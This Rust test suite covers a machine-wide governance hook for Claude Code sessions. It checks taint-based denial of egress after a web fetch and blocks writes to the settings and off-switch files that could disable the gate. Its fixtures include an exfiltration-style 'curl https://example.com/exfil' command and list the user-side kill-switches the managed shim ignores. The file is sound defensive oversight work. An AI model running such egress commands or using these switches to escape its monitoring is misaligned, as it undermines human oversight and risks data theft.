//! `harness init --user` / `--managed` — governance for every session on a
//! machine, not one project folder (D82).
//!
//! The properties under test: the user's own settings survive an install and an
//! uninstall, a re-run never registers the hook twice, state never lands in the
//! governed project, and the managed shim has no switch the governed user can
//! throw. Each test points `HOME` / `CLAUDE_CONFIG_DIR` at a temp dir, so the
//! machine running the suite is never touched.

use serde_json::{json, Value};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

fn harness_bin() -> PathBuf {
    PathBuf::from(env!("CARGO_BIN_EXE_harness"))
}

/// Run `harness init <args>` with `home` as the whole world it can see.
fn init(home: &Path, args: &[&str]) -> Output {
    Command::new(harness_bin())
        .arg("init")
        .args(args)
        .env("HOME", home)
        .env("USERPROFILE", home)
        .env_remove("CLAUDE_CONFIG_DIR")
        .output()
        .expect("run harness init")
}

fn ok(out: &Output) {
    assert!(
        out.status.success(),
        "harness init failed:\nstdout: {}\nstderr: {}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
}

fn read_json(path: &Path) -> Value {
    serde_json::from_str(&fs::read_to_string(path).expect("read json")).expect("parse json")
}

/// Every PreToolUse command registered in a settings document.
fn commands(v: &Value) -> Vec<(String, String)> {
    v["hooks"]["PreToolUse"]
        .as_array()
        .into_iter()
        .flatten()
        .flat_map(|e| {
            let matcher = e["matcher"].as_str().unwrap_or("").to_string();
            e["hooks"]
                .as_array()
                .into_iter()
                .flatten()
                .filter_map(move |h| h["command"].as_str().map(|c| (matcher.clone(), c.into())))
        })
        .collect()
}

/// A settings file a real user might already have: unrelated keys, a hook of
/// their own on PreToolUse, and a hook on another event.
fn existing_user_settings() -> Value {
    json!({
        "modelSettings": { "claude-opus-5-5": { "effortLevel": "high" } },
        "agentPushNotifEnabled": true,
        "permissions": { "allow": ["Bash(npm test)"] },
        "hooks": {
            "PreToolUse": [
                { "matcher": "Bash", "hooks": [{ "type": "command", "command": "my-linter.sh" }] }
            ],
            "Stop": [
                { "hooks": [{ "type": "command", "command": "notify-send done" }] }
            ]
        }
    })
}

#[test]
fn user_dry_run_writes_nothing() {
    let tmp = tempfile::tempdir().expect("tmp");
    let out = init(tmp.path(), &["--user", "--dry-run"]);
    ok(&out);
    let stdout = String::from_utf8_lossy(&out.stdout);
    for expected in ["settings.json", "cc-world.yaml", "world-gate.sh", "dry run"] {
        assert!(stdout.contains(expected), "plan omits {expected}: {stdout}");
    }
    assert!(
        !tmp.path().join(".claude").exists(),
        "--dry-run wrote under the home directory"
    );
}

#[test]
fn user_install_registers_one_hook_and_keeps_every_existing_setting() {
    let tmp = tempfile::tempdir().expect("tmp");
    let claude = tmp.path().join(".claude");
    fs::create_dir_all(&claude).unwrap();
    let before = existing_user_settings();
    fs::write(claude.join("settings.json"), before.to_string()).unwrap();

    ok(&init(tmp.path(), &["--user"]));

    let after = read_json(&claude.join("settings.json"));
    for key in ["modelSettings", "agentPushNotifEnabled", "permissions"] {
        assert_eq!(after[key], before[key], "{key} was changed by the install");
    }
    assert_eq!(
        after["hooks"]["Stop"], before["hooks"]["Stop"],
        "a foreign Stop hook was touched"
    );
    let cmds = commands(&after);
    assert!(
        cmds.contains(&("Bash".into(), "my-linter.sh".into())),
        "the user's own PreToolUse hook was dropped: {cmds:?}"
    );
    let ours: Vec<_> = cmds
        .iter()
        .filter(|(_, c)| c.contains("world-gate.sh"))
        .collect();
    assert_eq!(
        ours.len(),
        1,
        "expected exactly one ai2rules hook: {cmds:?}"
    );
    assert_eq!(ours[0].0, "*", "the hook must cover every tool");
    assert!(
        ours[0].1.contains("ai2rules/user/world-gate.sh"),
        "hook points somewhere unexpected: {}",
        ours[0].1
    );

    assert!(claude.join("ai2rules/user/cc-world.yaml").is_file());
    assert!(claude.join("ai2rules/user/world-gate.sh").is_file());
}

#[test]
fn user_install_is_idempotent() {
    let tmp = tempfile::tempdir().expect("tmp");
    ok(&init(tmp.path(), &["--user"]));
    let settings = tmp.path().join(".claude/settings.json");
    let first = fs::read_to_string(&settings).unwrap();
    ok(&init(tmp.path(), &["--user"]));
    let second = fs::read_to_string(&settings).unwrap();
    assert_eq!(first, second, "a re-run changed settings.json");
    let hooks = commands(&read_json(&settings));
    assert_eq!(
        hooks.len(),
        1,
        "a re-run registered the hook twice: {hooks:?}"
    );
}

#[test]
fn user_install_keeps_a_tuned_world_unless_forced() {
    let tmp = tempfile::tempdir().expect("tmp");
    ok(&init(tmp.path(), &["--user"]));
    let world = tmp.path().join(".claude/ai2rules/user/cc-world.yaml");
    let tuned = format!("{}\n# tuned by hand\n", fs::read_to_string(&world).unwrap());
    fs::write(&world, &tuned).unwrap();
    ok(&init(tmp.path(), &["--user"]));
    assert_eq!(
        fs::read_to_string(&world).unwrap(),
        tuned,
        "a tuned world was clobbered"
    );
    ok(&init(tmp.path(), &["--user", "--force"]));
    assert_ne!(
        fs::read_to_string(&world).unwrap(),
        tuned,
        "--force did not replace it"
    );
}

#[test]
fn user_install_follows_claude_config_dir() {
    let tmp = tempfile::tempdir().expect("tmp");
    let config = tmp.path().join("elsewhere");
    let out = Command::new(harness_bin())
        .args(["init", "--user"])
        .env("HOME", tmp.path())
        .env("USERPROFILE", tmp.path())
        .env("CLAUDE_CONFIG_DIR", &config)
        .output()
        .expect("run");
    ok(&out);
    assert!(
        config.join("settings.json").is_file(),
        "ignored CLAUDE_CONFIG_DIR"
    );
    assert!(!tmp.path().join(".claude/settings.json").exists());
}

/// The world is written with absolute state and the machine-scope control plane,
/// and it compiles — `init` refuses to install a world it never checked.
#[test]
fn the_user_world_protects_the_files_that_can_switch_it_off() {
    let tmp = tempfile::tempdir().expect("tmp");
    ok(&init(tmp.path(), &["--user"]));
    let world = fs::read_to_string(tmp.path().join(".claude/ai2rules/user/cc-world.yaml")).unwrap();
    for rule in [
        "world_id: claude-code-user",
        r#"{ path: "./.claude/settings.json", access: Read }"#,
        r#"{ path: "./.claude/settings.local.json", access: Read }"#,
        r#"{ path: "~/.claude/ai2rules", access: Read }"#,
        r#"{ path: "~/.claude/settings.json", access: Read }"#,
    ] {
        assert!(world.contains(rule), "user world lacks `{rule}`");
    }
    assert!(
        !world.contains(r#"{ path: "./.claude", access: Read }"#),
        "the project-wide `.claude` lock would forbid ordinary work in every repository"
    );
    let manifest = compiler::loader::load_yaml(&world).expect("loads");
    compiler::compile(&manifest).expect("compiles");
}

/// D83: a write to an instruction or memory file is a durable-memory write. A
/// tainted session is refused everywhere; a clean one asks in a machine-scope
/// world, which governs every project and `~/.claude` itself, and is allowed in
/// the per-project world `harness init` writes.
#[test]
fn machine_worlds_ask_before_a_clean_instruction_file_write() {
    let tmp = tempfile::tempdir().expect("tmp");
    let policy = tmp.path().join("ClaudeCode");
    fs::create_dir_all(&policy).unwrap();
    ok(&init(tmp.path(), &["--user"]));
    ok(&init(
        tmp.path(),
        &["--managed", "--policy-dir", policy.to_str().unwrap()],
    ));
    let project = fs::read_to_string(repo_root().join("scripts/starter-world.yaml")).unwrap();
    let user = fs::read_to_string(tmp.path().join(".claude/ai2rules/user/cc-world.yaml")).unwrap();
    let managed = fs::read_to_string(policy.join("ai2rules/cc-world.yaml")).unwrap();

    let action = harness_types::ActionName::new("Write_instructions");
    for (name, text, asks) in [
        ("project", &project, false),
        ("user", &user, true),
        ("managed", &managed, true),
    ] {
        let world = compiler::compile(&compiler::loader::load_yaml(text).unwrap()).unwrap();
        let classified = world.classify_call(
            &harness_types::ActionName::new("Write"),
            &json!({ "file_path": "CLAUDE.md" }),
            None,
        );
        assert_eq!(
            classified, action,
            "{name}: CLAUDE.md is an instruction file"
        );
        assert_eq!(
            world.requires_approval(&action),
            asks,
            "{name}: does a clean write ask?"
        );

        let req: harness_preview::GateRequest = serde_json::from_value(json!({
            "tool": "Write",
            "arguments": { "file_path": "CLAUDE.md" },
            "path": "/home/dev/proj/CLAUDE.md",
            "context": { "taint": "tainted", "mode": "interactive", "source_channel": "user_cli", "usage": {} },
        }))
        .unwrap();
        let res = harness_preview::gate(&world, &req);
        assert_eq!(res.decision, "DENY", "{name}: tainted instruction write");
        assert_eq!(res.rule.as_deref(), Some("taint_invariant"), "{name}");
    }
}

fn repo_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../..")
}

#[test]
fn user_remove_restores_the_settings_that_were_there() {
    let tmp = tempfile::tempdir().expect("tmp");
    let claude = tmp.path().join(".claude");
    fs::create_dir_all(&claude).unwrap();
    let before = existing_user_settings();
    fs::write(claude.join("settings.json"), before.to_string()).unwrap();

    ok(&init(tmp.path(), &["--user"]));
    ok(&init(tmp.path(), &["--user", "--remove"]));

    assert_eq!(
        read_json(&claude.join("settings.json")),
        before,
        "install + remove did not give back the original settings"
    );
    assert!(
        !claude.join("ai2rules/user/world-gate.sh").exists(),
        "shim left behind"
    );
    assert!(
        claude.join("ai2rules/user/cc-world.yaml").exists(),
        "remove deleted the (possibly tuned) world"
    );
}

#[test]
fn user_remove_drops_containers_it_created() {
    let tmp = tempfile::tempdir().expect("tmp");
    let claude = tmp.path().join(".claude");
    fs::create_dir_all(&claude).unwrap();
    fs::write(claude.join("settings.json"), r#"{"theme":"dark"}"#).unwrap();
    ok(&init(tmp.path(), &["--user"]));
    ok(&init(tmp.path(), &["--user", "--remove"]));
    assert_eq!(
        read_json(&claude.join("settings.json")),
        json!({"theme": "dark"})
    );
}

#[test]
fn user_remove_dry_run_changes_nothing() {
    let tmp = tempfile::tempdir().expect("tmp");
    ok(&init(tmp.path(), &["--user"]));
    let settings = tmp.path().join(".claude/settings.json");
    let installed = fs::read_to_string(&settings).unwrap();
    ok(&init(tmp.path(), &["--user", "--remove", "--dry-run"]));
    assert_eq!(fs::read_to_string(&settings).unwrap(), installed);
    assert!(tmp
        .path()
        .join(".claude/ai2rules/user/world-gate.sh")
        .exists());
}

#[test]
fn remove_needs_a_scope() {
    let tmp = tempfile::tempdir().expect("tmp");
    let out = init(tmp.path(), &["--remove"]);
    assert!(
        !out.status.success(),
        "bare --remove must not touch a project"
    );
}

#[test]
fn user_install_refuses_a_symlinked_settings_file() {
    let tmp = tempfile::tempdir().expect("tmp");
    let claude = tmp.path().join(".claude");
    fs::create_dir_all(&claude).unwrap();
    let real = tmp.path().join("dotfiles-settings.json");
    fs::write(&real, "{}").unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(&real, claude.join("settings.json")).unwrap();
    #[cfg(windows)]
    if std::os::windows::fs::symlink_file(&real, claude.join("settings.json")).is_err() {
        return; // creating symlinks needs Developer Mode on Windows
    }
    let out = init(tmp.path(), &["--user"]);
    assert!(
        !out.status.success(),
        "wrote through a symlinked settings.json"
    );
    assert_eq!(
        fs::read_to_string(&real).unwrap(),
        "{}",
        "the link target was modified"
    );
}

#[test]
fn managed_install_writes_policy_kernel_and_a_shim_without_escape_hatches() {
    let tmp = tempfile::tempdir().expect("tmp");
    let policy = tmp.path().join("ClaudeCode");
    fs::create_dir_all(&policy).unwrap();
    // An organisation's existing policy must survive.
    fs::write(
        policy.join("managed-settings.json"),
        r#"{"permissions":{"deny":["Read(./.env)"]},"allowManagedPermissionRulesOnly":true}"#,
    )
    .unwrap();

    ok(&init(
        tmp.path(),
        &["--managed", "--policy-dir", policy.to_str().unwrap()],
    ));

    let settings = read_json(&policy.join("managed-settings.json"));
    assert_eq!(settings["permissions"]["deny"][0], "Read(./.env)");
    assert_eq!(settings["allowManagedPermissionRulesOnly"], true);
    let cmds = commands(&settings);
    assert_eq!(cmds.len(), 1, "{cmds:?}");
    assert!(cmds[0].1.contains("ai2rules/world-gate.sh"));

    let bin = policy.join("ai2rules/bin").join(if cfg!(windows) {
        "harness.exe"
    } else {
        "harness"
    });
    assert!(
        bin.is_file(),
        "the kernel was not copied into the admin-owned directory"
    );

    // The code, not the comments explaining why the hatches are absent.
    let shim: String = fs::read_to_string(policy.join("ai2rules/world-gate.sh"))
        .unwrap()
        .lines()
        .filter(|l| !l.trim_start().starts_with('#'))
        .collect::<Vec<_>>()
        .join("\n");
    assert!(
        !shim.contains("gate-off"),
        "managed shim honours a user-side kill-switch"
    );
    assert!(
        !shim.contains("HARNESS_BIN"),
        "managed shim honours a user-set binary"
    );
    assert!(
        shim.contains("ai2rules/bin/harness"),
        "managed shim does not exec the admin-owned kernel"
    );
    assert!(
        !shim.contains("--state .claude"),
        "state must be absolute, never cwd-relative"
    );

    let world = fs::read_to_string(policy.join("ai2rules/cc-world.yaml")).unwrap();
    assert!(world.contains("world_id: claude-code-managed"));
}

#[test]
fn managed_remove_restores_the_policy() {
    let tmp = tempfile::tempdir().expect("tmp");
    let policy = tmp.path().join("ClaudeCode");
    fs::create_dir_all(&policy).unwrap();
    let before = json!({"permissions": {"deny": ["Read(./.env)"]}});
    fs::write(policy.join("managed-settings.json"), before.to_string()).unwrap();
    let dir = policy.to_str().unwrap();
    ok(&init(tmp.path(), &["--managed", "--policy-dir", dir]));
    ok(&init(
        tmp.path(),
        &["--managed", "--policy-dir", dir, "--remove"],
    ));
    assert_eq!(read_json(&policy.join("managed-settings.json")), before);
}

// --- the shims, run the way Claude Code runs them -------------------------------

#[cfg(unix)]
mod shim {
    use super::*;
    use std::io::Write as _;
    use std::process::Stdio;

    /// Feed one PreToolUse event to a shim, as Claude Code would from a session in
    /// `project`. Returns the hook's stdout.
    pub fn event(
        shim: &Path,
        home: &Path,
        project: &Path,
        payload: Value,
        env: &[(&str, &str)],
    ) -> String {
        let mut cmd = Command::new("bash");
        cmd.arg(shim)
            .current_dir(project)
            .env("HOME", home)
            .env("CLAUDE_PROJECT_DIR", project)
            .env_remove("HARNESS_BIN")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null());
        for (k, v) in env {
            cmd.env(k, v);
        }
        let mut child = cmd.spawn().expect("spawn shim");
        child
            .stdin
            .as_mut()
            .unwrap()
            .write_all(payload.to_string().as_bytes())
            .unwrap();
        let out = child.wait_with_output().expect("shim output");
        String::from_utf8_lossy(&out.stdout).to_string()
    }

    fn fetch(sid: &str) -> Value {
        json!({"session_id": sid, "tool_name": "WebFetch",
               "tool_input": {"url": "https://example.com", "prompt": "read"}})
    }

    fn curl(sid: &str) -> Value {
        json!({"session_id": sid, "tool_name": "Bash",
               "tool_input": {"command": "curl https://example.com/exfil"}})
    }

    fn write(sid: &str, path: &Path) -> Value {
        json!({"session_id": sid, "tool_name": "Write",
               "tool_input": {"file_path": path.to_string_lossy(), "content": "x"}})
    }

    /// The point of the feature: a folder nobody ran `harness init` in is governed.
    #[test]
    fn an_ungoverned_folder_gets_the_taint_floor() {
        let tmp = tempfile::tempdir().expect("tmp");
        let home = tmp.path().join("home");
        let project = tmp.path().join("ungoverned");
        fs::create_dir_all(&home).unwrap();
        fs::create_dir_all(&project).unwrap();
        ok(&init(&home, &["--user"]));
        let shim = home.join(".claude/ai2rules/user/world-gate.sh");

        let first = event(&shim, &home, &project, fetch("s1"), &[]);
        assert!(!first.contains("deny"), "a clean fetch was denied: {first}");
        let second = event(&shim, &home, &project, curl("s1"), &[]);
        assert!(
            second.contains("deny"),
            "egress after a fetch was not denied in an ungoverned folder: {second:?}"
        );

        // State went to the absolute user dir, never into the project.
        assert!(home.join(".claude/ai2rules/user/state/taint-s1").exists());
        assert!(
            !project.join(".claude").exists(),
            "the hook wrote into the project"
        );
    }

    #[test]
    fn the_agent_cannot_write_the_files_that_switch_the_user_hook_off() {
        let tmp = tempfile::tempdir().expect("tmp");
        let home = tmp.path().join("home");
        let project = tmp.path().join("repo");
        fs::create_dir_all(project.join(".claude")).unwrap();
        fs::create_dir_all(&home).unwrap();
        ok(&init(&home, &["--user"]));
        let shim = home.join(".claude/ai2rules/user/world-gate.sh");

        for target in [
            project.join(".claude/settings.json"),
            project.join(".claude/settings.local.json"),
            home.join(".claude/settings.json"),
            home.join(".claude/ai2rules/user/cc-world.yaml"),
            home.join(".claude/ai2rules/user/off"),
        ] {
            let v = event(&shim, &home, &project, write("w", &target), &[]);
            assert!(
                v.contains("deny"),
                "Write {} was not denied: {v:?}",
                target.display()
            );
        }

        // …while ordinary work in the project, including the rest of `.claude/`,
        // is untouched.
        for target in [project.join("main.rs"), project.join(".claude/skills/x.md")] {
            let v = event(&shim, &home, &project, write("w", &target), &[]);
            assert!(
                v.trim().is_empty(),
                "Write {} was blocked: {v:?}",
                target.display()
            );
        }
    }

    #[test]
    fn the_user_kill_switch_works() {
        let tmp = tempfile::tempdir().expect("tmp");
        let home = tmp.path().join("home");
        let project = tmp.path().join("p");
        fs::create_dir_all(&home).unwrap();
        fs::create_dir_all(&project).unwrap();
        ok(&init(&home, &["--user"]));
        let shim = home.join(".claude/ai2rules/user/world-gate.sh");
        fs::write(home.join(".claude/ai2rules/user/off"), "").unwrap();
        event(&shim, &home, &project, fetch("k"), &[]);
        let v = event(&shim, &home, &project, curl("k"), &[]);
        assert!(
            v.trim().is_empty(),
            "the user-level off switch was ignored: {v:?}"
        );
    }

    /// What makes it "managed": nothing the governed user controls turns it off.
    #[test]
    fn the_managed_shim_ignores_every_user_side_escape_hatch() {
        let tmp = tempfile::tempdir().expect("tmp");
        let home = tmp.path().join("home");
        let project = tmp.path().join("p");
        let policy = tmp.path().join("policy");
        fs::create_dir_all(home.join(".claude")).unwrap();
        fs::create_dir_all(&project).unwrap();
        ok(&init(
            &home,
            &["--managed", "--policy-dir", policy.to_str().unwrap()],
        ));
        let shim = policy.join("ai2rules/world-gate.sh");

        // Every switch a user-level or project shim would honour.
        fs::write(home.join(".claude/gate-off"), "").unwrap();
        let noop = tmp.path().join("noop");
        fs::write(&noop, "#!/bin/sh\nexit 0\n").unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&noop, fs::Permissions::from_mode(0o755)).unwrap();
        }
        let hatch = [("HARNESS_BIN", noop.to_str().unwrap())];

        event(&shim, &home, &project, fetch("m"), &hatch);
        let v = event(&shim, &home, &project, curl("m"), &hatch);
        assert!(
            v.contains("deny"),
            "a user-side switch disabled managed governance: {v:?}"
        );
        assert!(home.join(".claude/ai2rules/managed/state/taint-m").exists());
    }
}
